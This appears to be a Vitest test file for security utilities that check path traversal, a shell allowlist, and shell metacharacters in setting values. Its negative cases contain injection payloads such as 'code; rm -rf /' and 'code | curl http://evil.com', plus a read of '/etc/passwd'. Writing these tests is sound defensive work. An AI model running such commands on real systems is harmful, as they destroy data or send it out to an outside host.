import { expect, test, describe } from "vitest";
import { isSafePath, isValidShell, isValidSettingValue } from "./security";
import path from "node:path";

describe("Security Utils", () => {
    const baseDir = "/root/project";

    describe("isSafePath", () => {
        test("should allow relative paths within base", () => {
            expect(isSafePath(baseDir, "src/index.ts")).toBe(true);
            expect(isSafePath(baseDir, "package.json")).toBe(true);
        });

        test("should allow absolute paths within base", () => {
            expect(isSafePath(baseDir, path.join(baseDir, "src/index.ts"))).toBe(true);
        });

        test("should block path traversal", () => {
            expect(isSafePath(baseDir, "../outside.txt")).toBe(false);
            expect(isSafePath(baseDir, "src/../../outside.txt")).toBe(false);
        });

        test("should block absolute paths outside base", () => {
            expect(isSafePath(baseDir, "/etc/passwd")).toBe(false);
        });
    });

    describe("isValidShell", () => {
        test("should allow standard shells", () => {
            expect(isValidShell("bash")).toBe(true);
            expect(isValidShell("zsh")).toBe(true);
            expect(isValidShell("powershell")).toBe(true);
            expect(isValidShell("cmd.exe")).toBe(true);
        });

        test("should allow full paths to standard shells", () => {
            expect(isValidShell("/bin/bash")).toBe(true);
            expect(isValidShell("C:\\Windows\\System32\\cmd.exe")).toBe(true);
        });

        test("should block non-allowlisted commands", () => {
            expect(isValidShell("rm")).toBe(false);
            expect(isValidShell("python")).toBe(false);
            expect(isValidShell("curl")).toBe(false);
        });
    });

    describe("isValidSettingValue", () => {
        test("should allow safe characters", () => {
            expect(isValidSettingValue("code")).toBe(true);
            expect(isValidSettingValue("cursor --wait")).toBe(true);
            expect(isValidSettingValue("/usr/local/bin/editor")).toBe(true);
            expect(isValidSettingValue("C:\\Program Files\\Editor\\edit.exe")).toBe(true);
        });

        test("should block shell metacharacters", () => {
            expect(isValidSettingValue("code; rm -rf /")).toBe(false);
            expect(isValidSettingValue("code && touch /tmp/pwned")).toBe(false);
            expect(isValidSettingValue("code | curl http://evil.com")).toBe(false);
            expect(isValidSettingValue("code $(whoami)")).toBe(false);
            expect(isValidSettingValue("code `id`")).toBe(false);
        });

        test("should enforce length limit", () => {
            expect(isValidSettingValue("a".repeat(256))).toBe(false);
        });
    });
});
